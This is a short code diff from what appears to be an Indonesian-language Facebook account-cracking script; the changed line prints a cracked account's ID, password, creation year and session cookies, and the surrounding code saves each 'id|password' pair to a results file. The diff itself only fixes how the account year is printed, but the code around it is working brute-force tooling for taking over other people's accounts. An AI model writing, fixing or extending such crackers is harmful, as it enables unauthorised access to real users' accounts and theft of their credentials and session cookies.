@@ -1550,7 +1550,7 @@ def reguler(idf,pwv):
                 ok+=1
                 print('\n')
                 kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
-                print( f'{H}Akun Succes{P2}\n[•] ID       : {idf}\n[•] PASSWORD : {pw}\n[•] TAHUN : {cektahun}\n[•] COOKIES  : {kuki}')
+                print( f'{H}Akun Succes{P2}\n[•] ID       : {idf}\n[•] PASSWORD : {pw}\n[•] TAHUN : {cektahun(idf)}\n[•] COOKIES  : {kuki}')
                 os.popen('play-audio o.mp3')
                 open('OK/'+okc,'a').write(idf+'|'+pw+'\n')
                 break
